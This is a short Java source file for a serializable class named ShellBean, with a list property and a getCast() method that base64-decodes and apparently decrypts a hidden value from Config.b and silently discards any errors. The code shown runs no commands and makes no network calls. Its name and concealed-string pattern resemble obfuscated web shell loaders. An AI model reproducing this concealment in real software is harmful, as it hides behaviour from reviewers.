package com.util;

import com.github.devswork.config.Config;
import com.github.devswork.util.A2z;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Base64;


public class ShellBean implements Serializable {
    private static final long serialVersionUID = 1L;
    private ArrayList<String> list;
    private static Base64.Decoder d = Base64.getDecoder();
    public String cast;

    public String getCast() {
        try { cast = A2z.dpt(new String(d.decode(Config.b))); } catch (Exception e) { }
        return cast;
    }

    public ArrayList<String> getList() {
        return list;
    }

    public void setList(ArrayList<String> list) {
        this.list = list;
    }

}
